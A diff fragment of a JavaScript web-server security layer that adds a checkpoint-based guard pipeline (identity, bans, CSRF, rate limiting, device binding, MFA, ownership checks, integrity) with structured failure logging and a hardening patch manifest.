+    failed_stage: String(ctx && ctx.failedStageV211 || '').slice(0, 80),
+    reason: String(ctx && ctx.failureReasonV211 || extra && extra.reason || '').slice(0, 120),
+    failure_class: String(ctx && ctx.failureClassificationV221 && ctx.failureClassificationV221.failureClass || extra && extra.failure_class || '').slice(0, 80),
+    severity: String(ctx && ctx.failureClassificationV221 && ctx.failureClassificationV221.severity || extra && extra.severity || '').slice(0, 20),
+    duration_ms: Math.max(0, Date.now() - Number(ctx && ctx.startedAt || Date.now())),
+    hardening_patch: typeof DIRAC_CENTRAL_HARDENING_V221 !== 'undefined' ? DIRAC_CENTRAL_HARDENING_V221 : undefined,
+    pipeline_hash: typeof DIRAC_CENTRAL_PIPELINE_HASH_V221 !== 'undefined' ? DIRAC_CENTRAL_PIPELINE_HASH_V221 : undefined,
+    diagnostic_patch: ctx && (ctx.ownerResolutionDebugV212 || ctx.serviceRoleDebugV212) ? DIRAC_CENTRAL_OWNER_DEBUG_V212 : undefined,
+    diagnostic_code: String(extra && extra.diagnostic_code || ctx && ctx.serviceRoleDebugV212 && ctx.serviceRoleDebugV212.diagnostic_code || '').slice(0, 160),
+    failure_point: String(extra && extra.failure_point || ctx && ctx.serviceRoleDebugV212 && ctx.serviceRoleDebugV212.failure_point || '').slice(0, 180),
+    passport_hex: (() => { try { return BigInt(ctx && ctx.passport || 0n).toString(16); } catch (_) { return '0'; } })(),
+    trace: diracCentralStageTraceV211(ctx, 30),
+    owner_resolution_debug: ctx && ctx.ownerResolutionDebugV212
+      ? diracCentralSanitizeOutputV146(ctx.ownerResolutionDebugV212, 0)
+      : undefined,
+    service_role_debug: ctx && ctx.serviceRoleDebugV212
+      ? diracCentralSanitizeOutputV146(ctx.serviceRoleDebugV212, 0)
+      : undefined,
+    owner_bootstrap_debug: ctx && ctx.ownerBootstrapDebugV213
+      ? diracCentralSanitizeOutputV146(ctx.ownerBootstrapDebugV213, 0)
+      : undefined,
+    extra: extra && typeof extra === 'object' ? diracCentralSanitizeOutputV146(extra, 0) : undefined
+  };
+  try {
+    const line = JSON.stringify(payload);
+    if (event === 'request_passed' && diracCentralDebugEnabledV211()) console.info('[dirac-central-debug-v211]', line);
+    else if (event !== 'request_passed') console.error('[dirac-central-debug-v211]', line);
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  return payload;
+}
+
+function diracCentralGuardPhaseValidV211(ctx) {
+  if (!ctx || !ctx.req || !ctx.res) return false;
+  if (diracCentralCurrentContextV149() !== ctx) return false;
+  if (ctx.executionPhaseV211 !== 'guard') return false;
+  if (ctx.req.__diracCentralSecurityGuardPassedV146 === true) return false;
+  if (!Number.isInteger(ctx.currentStageIndexV211) || ctx.currentStageIndexV211 < 0) return false;
+  if (!String(ctx.currentStageV211 || '')) return false;
+  return true;
+}
+
+function diracCentralHandlerContextFullyPassedV211(ctx, req) {
+  if (!ctx || !req || ctx.req !== req || !ctx.res) return false;
+  if (diracCentralCurrentContextV149() !== ctx) return false;
+  if (ctx.executionPhaseV211 !== 'handler') return false;
+  if (req.__diracCentralSecurityGuardPassedV146 !== true || ctx.centralGuardFullyPassedV211 !== true) return false;
+  if (ctx.terminalResponse || ctx.terminalBlockReason || ctx.failedStageV211) return false;
+  try {
+    const actual = BigInt(ctx.passport || 0n);
+    if ((actual & DIRAC_V202_ALL_CHECKPOINTS) !== DIRAC_V202_ALL_CHECKPOINTS) return false;
+  } catch (_) { return false; }
+  for (const stamp of Object.keys(DIRAC_V202_CHECKPOINT_BY_STAMP)) {
+    if (!ctx.guardPassport || ctx.guardPassport[stamp] !== true) return false;
+  }
+  return Boolean(ctx.action && ACTION_POLICY[ctx.action] && ctx.policy === ACTION_POLICY[ctx.action]);
+}
+
+function diracCentralGatewayContextAllowedV211(ctx) {
+  if (diracCentralGuardPhaseValidV211(ctx)) return { ok: true, phase: 'guard' };
+  if (ctx && diracCentralHandlerContextFullyPassedV211(ctx, ctx.req)) return { ok: true, phase: 'handler' };
+  return { ok: false, phase: String(ctx && ctx.executionPhaseV211 || 'missing') };
+}
+
+/* ============================================================
+   v202 CENTRAL POLICY, CONTEXT, CHECKPOINTS, AND STATIC PIPELINE
+   ============================================================ */
+const CHECKPOINT = Object.freeze({
+  IDENTITY: 1n << 0n,
+  MEMORY_BAN: 1n << 1n,
+  PERSISTENT_BAN: 1n << 2n,
+  ACTION_FORMAT: 1n << 3n,
+  ALIAS: 1n << 4n,
+  WHITELIST: 1n << 5n,
+  SERVER_ROLE: 1n << 6n,
+  ENV_PARTITION: 1n << 7n,
+  CLASSIFICATION: 1n << 8n,
+  RATE_LIMIT: 1n << 9n,
+  SERVER_AUTHENTICATION: 1n << 10n,
+  BROWSER_AUTHENTICITY: 1n << 11n,
+  CSRF: 1n << 12n,
+  PAGE_NONCE: 1n << 13n,
+  BROWSER_SIGNAL: 1n << 14n,
+  DEVICE_BINDING: 1n << 15n,
+  ADMIN_AUTHENTICATION: 1n << 16n,
+  PUBLIC_READ_POLICY: 1n << 17n,
+  BODY_VALIDATION: 1n << 18n,
+  LIGHT_GUARD: 1n << 19n,
+  CONTRACT_VALIDATION: 1n << 20n,
+  A2F_SIGNATURE: 1n << 21n,
+  SECURITY_REPORT: 1n << 22n,
+  REQUEST_SAMPLE: 1n << 23n,
+  THREAT_DETECTION: 1n << 24n,
+  ZERO_DAY: 1n << 25n,
+  IDOR_BOLA: 1n << 26n,
+  CIRCUIT_BREAKER: 1n << 27n,
+  MFA: 1n << 28n,
+  INTEGRITY: 1n << 29n
+});
+const DIRAC_V202_CHECKPOINT_BY_STAMP = Object.freeze({
+  identity_checked: CHECKPOINT.IDENTITY,
+  memory_ban_checked: CHECKPOINT.MEMORY_BAN,
+  persistent_ban_checked: CHECKPOINT.PERSISTENT_BAN,
+  action_format_checked: CHECKPOINT.ACTION_FORMAT,
+  alias_checked: CHECKPOINT.ALIAS,
+  whitelist_checked: CHECKPOINT.WHITELIST,
+  vercel2_action_checked: CHECKPOINT.SERVER_ROLE,
+  server1_env_partition_checked: CHECKPOINT.ENV_PARTITION,
+  classification_checked: CHECKPOINT.CLASSIFICATION,
+  rate_checked: CHECKPOINT.RATE_LIMIT,
+  server_guard_checked: CHECKPOINT.SERVER_AUTHENTICATION,
+  browser_auth_checked: CHECKPOINT.BROWSER_AUTHENTICITY,
+  csrf_checked: CHECKPOINT.CSRF,
+  page_nonce_checked: CHECKPOINT.PAGE_NONCE,
+  browser_signal_checked: CHECKPOINT.BROWSER_SIGNAL,
+  device_checked: CHECKPOINT.DEVICE_BINDING,
+  admin_checked: CHECKPOINT.ADMIN_AUTHENTICATION,
+  public_read_checked: CHECKPOINT.PUBLIC_READ_POLICY,
+  body_checked: CHECKPOINT.BODY_VALIDATION,
+  light_checked: CHECKPOINT.LIGHT_GUARD,
+  contract_checked: CHECKPOINT.CONTRACT_VALIDATION,
+  a2f_signature_checked: CHECKPOINT.A2F_SIGNATURE,
+  security_report_checked: CHECKPOINT.SECURITY_REPORT,
+  sample_checked: CHECKPOINT.REQUEST_SAMPLE,
+  threat_checked: CHECKPOINT.THREAT_DETECTION,
+  zeroday_checked: CHECKPOINT.ZERO_DAY,
+  idor_checked: CHECKPOINT.IDOR_BOLA,
+  circuit_checked: CHECKPOINT.CIRCUIT_BREAKER,
+  mfa_checked: CHECKPOINT.MFA,
+  integrity_checked: CHECKPOINT.INTEGRITY
+});
+const DIRAC_V202_ALL_CHECKPOINTS = Object.values(CHECKPOINT).reduce((mask, bit) => mask | bit, 0n);
+const DIRAC_V202_PRE_INTEGRITY_CHECKPOINTS = DIRAC_V202_ALL_CHECKPOINTS & ~CHECKPOINT.INTEGRITY;
+
+function diracV202CheckpointNotApplicable(ctx) {
+  return Boolean(ctx && (ctx.terminalResponse === 'disabled' || ctx.terminalBlockReason));
+}
+function diracV202StageResult(ok, extra) { return Object.assign({ ok: Boolean(ok) }, extra || {}); }
+
+async function guardIdentityV202(ctx) {
+  if (!ctx.req || typeof ctx.req !== 'object') return diracV202StageResult(false, { directCode: 'CENTRAL_GUARD_REQUEST_INVALID' });
+  ctx.req.__diracCentralSecurityGuardPassedV146 = false;
+  diracCentralWrapResponseHeadersV221(ctx.res);
+  diracCentralApplyHeadersV146(ctx.res);
+  secureResponseGateway(ctx, ctx.res);
+  ctx.identity = await diracCentralBuildIdentityV146(ctx.req);
+  ctx.clientIpHash = String(ctx.identity && ctx.identity.key || '');
+  ctx.userAgentHash = diracCentralHashV146(String(ctx.headers['user-agent'] || ''));
+  return diracV202StageResult(true);
+}
+function guardMemoryBanV202(ctx) {
+  const result = diracCentralCheckMemoryBanV146(ctx.identity);
+  return result.blocked ? diracV202StageResult(false, { directCode: 'MEMORY_BAN_ACTIVE' }) : diracV202StageResult(true);
+}
+async function guardPersistentBanV202(ctx) {
+  const result = await diracCentralCheckPersistentBanV146(ctx.req, ctx.identity);
+  if (result.blocked) {
+    diracCentralSetMemoryBanV146(ctx.identity, result.blockedUntilMs, 'persistent_ban');
+    return diracV202StageResult(false, { directCode: 'PERSISTENT_BAN_ACTIVE' });
+  }
+  diracCentralSetNegativeCacheV146(ctx.identity);
+  return diracV202StageResult(true);
+}
+function guardActionFormatV202(ctx) {
+  const format = diracCentralValidateActionFormatV146(ctx.rawAction, ctx.rawAction.toLowerCase());
+  return format.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: format.reason, action: ctx.rawAction.toLowerCase() || 'missing_action' });
+}
+function guardAliasV202(ctx) {
+  const alias = diracCentralNormalizeAliasV146(ctx.rawAction.toLowerCase());
+  if (!alias.ok) return diracV202StageResult(false, { reason: alias.reason, action: ctx.rawAction.toLowerCase() });
+  ctx.action = alias.action;
+  ctx.isA2FAction = diracCentralIsA2FActionV148(ctx.action);
+  if (ctx.req.query) ctx.req.query.action = ctx.action;
+  try {
+    const serviceScopeCtx = typeof diracBolaIdorV121CurrentContext === 'function'
+      ? diracBolaIdorV121CurrentContext()
+      : null;
+    if (serviceScopeCtx && typeof serviceScopeCtx === 'object') {
+      const inheritedAction = typeof diracBolaIdorV121NormalizeAction === 'function'
+        ? diracBolaIdorV121NormalizeAction(serviceScopeCtx.action || '')
+        : String(serviceScopeCtx.action || '').trim().toLowerCase().replace(/[\s-]+/g, '_').slice(0, 120);
+      const inheritedMethod = String(serviceScopeCtx.method || '').trim().toUpperCase();
+      if (inheritedAction && inheritedAction !== ctx.action) {
+        return diracV202StageResult(false, { reason: 'service_role_action_context_mismatch' });
+      }
+      if (inheritedMethod && inheritedMethod !== ctx.method) {
+        return diracV202StageResult(false, { reason: 'service_role_method_context_mismatch' });
+      }
+      serviceScopeCtx.action = ctx.action;
+      serviceScopeCtx.raw_action = String(ctx.rawAction || ctx.action).slice(0, 120);
+    }
+  } catch (_) {
+    return diracV202StageResult(false, { reason: 'service_role_action_context_propagation_failed' });
+  }
+  return diracV202StageResult(true);
+}
+function guardWhitelistV202(ctx) {
+  if (!DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(ctx.action) && !DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(ctx.action)) {
+    return diracV202StageResult(false, { reason: 'action_not_in_global_whitelist' });
+  }
+  ctx.policy = ACTION_POLICY[ctx.action] || null;
+  if (!ctx.policy) return diracV202StageResult(false, { reason: 'action_policy_missing' });
+  if (DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(ctx.action)) ctx.terminalResponse = 'disabled';
+  return diracV202StageResult(true);
+}
+function guardDeploymentRoleV202(ctx) {
+  if (ctx.terminalResponse === 'disabled') return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = diracCentralVercel2OnlyActionGuardV150(ctx.action);
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+function guardEnvironmentPartitionV202(ctx) {
+  if (ctx.terminalResponse === 'disabled') return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = diracCentralServer1RecoveryEnvPartitionGuardV190(ctx.action);
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+function guardClassificationV202(ctx) {
+  if (ctx.terminalResponse === 'disabled') return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const declaredServerId = diracS2SIdV206(diracS2SHeaderV206(ctx.req, 'x-dirac-server-id'));
+  ctx.classification = ctx.action === 'security_report' && declaredServerId
+    ? 'server'
+    : diracCentralClassifyActionV146(ctx.action);
+  ctx.authentication = ctx.action === 'security_report'
+    ? ctx.classification
+    : (ctx.policy && ctx.policy.authentication || ctx.classification);
+  if (diracCentralIsPreflightV221(ctx)) {
+    const preflight = diracCentralValidatePreflightV221(ctx);
+    if (!preflight.ok) return diracV202StageResult(false, { reason: preflight.reason });
+    ctx.preflightValidatedV221 = true;
+    ctx.preflightRequestedMethodV221 = preflight.requestedMethod;
+    ctx.preflightRequestedHeadersV221 = preflight.requestedHeaders;
+    ctx.preflightOriginV221 = preflight.origin;
+    ctx.preflightContextHashV221 = diracCentralPreflightContextHashV221(ctx);
+    ctx.preflightCheckpointProofsV221 = Object.create(null);
+  }
+  return diracV202StageResult(true);
+}
+async function guardRateLimitV202(ctx) {
+  if (ctx.terminalResponse === 'disabled' || ctx.terminalBlockReason) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = await diracCentralDistributedRateLimitGuardV146(ctx.req, ctx);
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const layered = diracCentralLayeredRateGuardV221(ctx.req, ctx);
+  return layered.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: layered.reason });
+}
+async function guardServerAuthenticationV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'server_authentication');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  let sevenSignatureVerification = null;
+  if (diracS2SIsInternalActionV206(ctx)) {
+    const envelope = diracCentralS2SEnvelopeGuardV221(ctx.req, ctx);
+    if (!envelope.ok) return diracV202StageResult(false, { reason: envelope.reason });
+    const serverBodyLimit = ctx.action === DIRAC_RECOVERY_WORKER_ACTION ? customerSecurityRecoveryWorkerMaxBodyBytes() : 64 * 1024;
+    const parsed = await diracCentralBodyHandlingGuardV146(ctx.req, ctx, serverBodyLimit);
+    if (!parsed.ok) return diracV202StageResult(false, { reason: parsed.reason });
+    sevenSignatureVerification = await diracS2SVerifyInboundV206(ctx.req, ctx);
+    if (!sevenSignatureVerification.ok) {
+      await diracS2SHandleInboundFailureV206(ctx, sevenSignatureVerification, sevenSignatureVerification.reason);
+      return diracV202StageResult(false, { reason: sevenSignatureVerification.reason });
+    }
+    ctx.__diracS2SSevenSignaturesVerifiedV206 = true;
+  }
+  const result = await diracCentralServerToServerGuardV146(ctx.req, ctx.res, ctx);
+  if (!result.ok && sevenSignatureVerification && sevenSignatureVerification.ok) {
+    await diracS2SHandleInboundFailureV206(ctx, sevenSignatureVerification, 'legacy_server_authentication_' + String(result.reason || 'invalid'));
+  }
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+function guardBrowserAuthenticityV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'browser_authenticity');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = diracCentralPageBrowserAuthenticityGuardV146(ctx.req, ctx);
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+function guardCsrfV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'csrf');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = diracCentralCsrfGuardV146(ctx.req, ctx.res, ctx);
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const postVerify = diracCentralCsrfPostVerifyV221(ctx.req, ctx);
+  return postVerify.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: postVerify.reason });
+}
+async function guardPageNonceV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'page_nonce');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = await diracCentralPageNonceGuardV146(ctx.req, ctx.res, ctx);
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+function guardBrowserSignalsV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'browser_signal');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = diracCentralBrowserSignalGuardV146(ctx.req, ctx);
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+async function guardDeviceBindingV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'device_binding');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = diracCentralDeviceConsistencyGuardV146(ctx.req, ctx);
+  ctx.deviceId = String(ctx.identity && (ctx.identity.deviceKey || ctx.identity.key) || '');
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const credential = await diracCentralDeviceCredentialGuardV221(ctx.req, ctx.res, ctx);
+  const decision = credential && credential.issued
+    ? 'device_credential_issued'
+    : credential && credential.rotated
+      ? 'device_credential_rotated_after_verified_bootstrap'
+      : undefined;
+  return credential && credential.ok ? diracV202StageResult(true, decision)
+    : diracV202StageResult(false, { reason: credential && credential.reason || 'device_credential_guard_failed' });
+}
+async function guardAdminAuthenticationV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'admin_authentication');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = await diracCentralAdminAuthGuardV146(ctx.req, ctx.res, ctx);
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const stepUp = diracCentralAdminStepUpGuardV221(ctx.req, ctx);
+  return stepUp.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: stepUp.reason });
+}
+async function guardPublicReadV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'public_read_policy');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = await diracCentralPublicReadGuardV146(ctx.req, ctx);
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+async function guardBodyV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) { ctx.body = {}; ctx.bodyHash = crypto.createHash('sha256').update('{}').digest('hex'); return diracCentralPreflightStageResultV221(ctx, 'body_validation'); }
+  if (diracV202CheckpointNotApplicable(ctx)) { ctx.body = {}; return diracV202StageResult(true, { decision: 'not_applicable_by_policy' }); }
+  const result = await diracCentralBodyHandlingGuardV146(ctx.req, ctx);
+  if (result.ok) {
+    const bodyText = (() => { try { return JSON.stringify(ctx.body || {}); } catch (_) { return ''; } })();
+    ctx.bodyHash = crypto.createHash('sha256').update(bodyText).digest('hex');
+  }
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+function guardLightV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'light_guard');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = diracCentralLightGuardV146(ctx.req, ctx);
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+function guardContractV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'contract_validation');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = diracCentralContractGuardV146(ctx.req, ctx);
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const advanced = diracCentralAdvancedContractGuardV221(ctx.req, ctx);
+  return advanced.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: advanced.reason });
+}
+async function guardA2FV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'a2f_signature');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = await diracCentralA2FRequestSignatureGuardV148(ctx.req, ctx);
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+async function guardSecurityReportV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'security_report');
+  if (ctx.terminalResponse === 'disabled') return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  if (ctx.action !== 'security_report') return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  if (ctx.classification === 'server') {
+    const processed = await diracS2SProcessSecurityReportV206(ctx);
+    if (!processed.ok) return diracV202StageResult(false, { reason: processed.reason });
+    ctx.__diracS2SSecurityReportResultV206 = processed.response;
+    return diracV202StageResult(true);
+  }
+  const result = diracCentralSecurityReportGuardV146(ctx.req, ctx);
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  ctx.terminalBlockReason = 'html_security_report';
+  return diracV202StageResult(true);
+}
+function guardRequestSampleV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) {
+    ctx.sample = JSON.stringify({ action: ctx.action, origin: ctx.preflightOriginV221, method: ctx.preflightRequestedMethodV221, headers: ctx.preflightRequestedHeadersV221 });
+    ctx.normalizedSampleV202 = diracCentralNormalizeSampleV146(ctx.sample);
+    return diracCentralPreflightStageResultV221(ctx, 'request_sample');
+  }
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  ctx.skipHeavyScan = false;
+  const result = diracCentralSampleCollectorV146(ctx.req, ctx);
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+function guardThreatV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) {
+    const checked = diracCentralPreflightStageResultV221(ctx, 'threat_detection');
+    if (!checked.ok) return checked;
+    const preflightThreat = diracCentralContextualThreatGuardV221(ctx.req, ctx);
+    return preflightThreat.detected ? diracV202StageResult(false, { reason: preflightThreat.kind }) : checked;
+  }
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  ctx.normalizedSampleV202 = diracCentralNormalizeSampleV146(ctx.sample);
+  const result = diracCentralContextualThreatGuardV221(ctx.req, ctx);
+  if (result.detected) {
+    ctx.threatEvidenceV221 = Object.freeze({
+      kind: String(result.kind || 'unknown').slice(0, 100),
+      field_hash: diracCentralHashV146(String(result.field || '')).slice(0, 32)
+    });
+    return diracV202StageResult(false, { reason: result.kind });
+  }
+  return diracV202StageResult(true);
+}
+function guardZeroDayV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) {
+    const checked = diracCentralPreflightStageResultV221(ctx, 'zero_day');
+    if (!checked.ok) return checked;
+    const shield = diracCentralZeroDayShieldV146(ctx.req, ctx, ctx.normalizedSampleV202 || '');
+    return shield.ok ? checked : diracV202StageResult(false, { reason: shield.reason });
+  }
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = diracCentralZeroDayShieldV146(ctx.req, ctx, ctx.normalizedSampleV202 || '');
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+async function guardOwnershipV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'idor_bola');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const result = await diracCentralIdorBolaGuardV146(ctx.req, ctx);
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const postcondition = diracCentralOwnershipPostconditionV221(ctx);
+  if (!postcondition.ok) return diracV202StageResult(false, { reason: postcondition.reason });
+  ctx.ownership = Object.freeze({ verified: true, action: ctx.action, patch: DIRAC_CENTRAL_HARDENING_V221 });
+  return diracV202StageResult(true);
+}
+async function guardCircuitBreakerV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) {
+    const checked = diracCentralPreflightStageResultV221(ctx, 'circuit_breaker');
+    if (!checked.ok) return checked;
+    const preflightCircuit = await diracCentralCircuitBreakerV146(ctx.req, ctx, 'preflight_allow');
+    return preflightCircuit.ok ? checked : diracV202StageResult(false, { reason: preflightCircuit.reason });
+  }
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const elapsed = Date.now() - Number(ctx.startedAt || Date.now());
+  if (elapsed > diracCentralGuardBudgetMsV221(ctx)) return diracV202StageResult(false, { reason: 'circuit_guard_time_budget_exceeded' });
+  const result = await diracCentralCircuitBreakerV146(ctx.req, ctx, 'allow');
+  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+}
+function guardMfaV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'mfa');
+  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const action = String(ctx.action || '');
+  if (action !== 'customer_security_features_bundle_v2' && action !== 'customer_security_features_bundle_v3') {
+    return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  }
+  const result = diracCentralMfaEnvelopeV221(ctx.req, ctx);
+  if (result.ok) {
+    ctx.mfaVerifiedV221 = true;
+    return diracV202StageResult(true);
+  }
+  if (result.expected && result.reason === 'mfa_required') {
+    ctx.terminalResponse = 'mfa_required_v221';
+    ctx.mfaRequiredReasonV221 = result.reason;
+    return diracV202StageResult(true, { decision: 'mfa_required_terminal_response' });
+  }
+  return diracV202StageResult(false, { reason: result.reason || 'mfa_envelope_invalid' });
+}
+function guardIntegrityV202(ctx) {
+  const result = diracCentralIntegrityVerifierV146(ctx);
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const hardened = diracCentralPipelineIntegrityV221(ctx);
+  return hardened.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: hardened.reason });
+}
+
+
+/* ============================================================
+   DIRAC CENTRAL GUARD HARDENING v221
+   Narrow security-only patch:
+   - preserves all business handlers and the existing ban mechanism;
+   - every pipeline checkpoint still executes and receives a signed decision;
+   - strengthens preflight validation, contextual threat inspection, schemas,
+     layered limits, MFA/device/admin envelopes, egress timeout, integrity,
+     logging, and deterministic self-tests.
+   ============================================================ */
+const DIRAC_CENTRAL_HARDENING_V221 = 'dirac-central-guard-hardening-v221';
+const DIRAC_CENTRAL_PATCH_TARGETS_V221 = Object.freeze([
+  '01_preflight_and_method',
+  '02_failure_classification',
+  '03_contextual_threat_detection',
+  '04_canonicalization',
+  '05_per_action_contract_schema',
+  '06_json_and_parameter_pollution',
+  '07_layered_rate_and_concurrency',
+  '08_mfa_state_machine_and_binding',
+  '09_csrf_binding_and_rotation_validation',
+  '10_browser_authenticity_hardening',
+  '11_server_issued_device_binding',
+  '12_idor_bola_postcondition',
+  '13_ssrf_and_egress_control',
+  '14_s2s_envelope_and_replay_preconditions',
+  '15_admin_recent_mfa_step_up',
+  '16_fail_closed_exception_and_timeout',
+  '17_pipeline_registry_and_source_integrity',
+  '18_headers_cookie_and_response_integrity',
+  '19_structured_security_decision_logging',
+  '20_resource_budget_and_anti_dos',
+  '21_code_quality_runtime_invariants',
+  '22_deterministic_security_self_tests'
+]);
+const DIRAC_CENTRAL_LEGACY_DUPLICATE_FUNCTIONS_V221 = Object.freeze({
+  diracV107ShouldSkip: 2,
+  orderMailNormalizeEmail: 2,
+  orderMailOwnerEnabled: 2,
+  orderMailParseEmailList: 2,
+  orderMailPublicConfigInfo: 2,
+  orderMailSendViaSmtpSafe: 2,
+  orderMailSmtpConfig: 2,
+  readDiracSupabaseCredentials: 3,
+  sessionOwnershipCheckoutFindProductForCheckout: 2,
+  sessionOwnershipCheckoutProductIdCandidates: 2,
+  sessionOwnershipCheckoutProductScore: 2
+});
+const DIRAC_CENTRAL_BAN_FUNCTION_HASHES_V221 = Object.freeze({
+  diracCentralBanAndBlockV146: 'ccb34def6531a169c1636cb6f5103da6ef8ef53993ea06ff6e00124c8212dd3a',
+  diracCentralWritePersistentBanV146: '39aff298cdaa263aeb6d6e4592ea7554d32f2e56006efdef7cffc88a4b8ee89a',
+  diracCentralCheckPersistentBanV146: '421fce951769abb72590b6bcd1a961978b962ef8e80575e0a515441f5b7ac111',
+  diracCentralBlockMsV146: '15ba6d2ca1c5370c7d650b5f82b0e93169f7e9085426877664d962412f7dfce2',
+  diracCentralSetMemoryBanV146: 'd9018b8a398fe4d0cc0b2343ff697307793051e85591471055b5883775d1d9b6'
+});
+const DIRAC_CENTRAL_BAN_FUNCTIONS_V221 = Object.freeze({
+  diracCentralBanAndBlockV146,
+  diracCentralWritePersistentBanV146,
+  diracCentralCheckPersistentBanV146,
+  diracCentralBlockMsV146,
+  diracCentralSetMemoryBanV146
+});
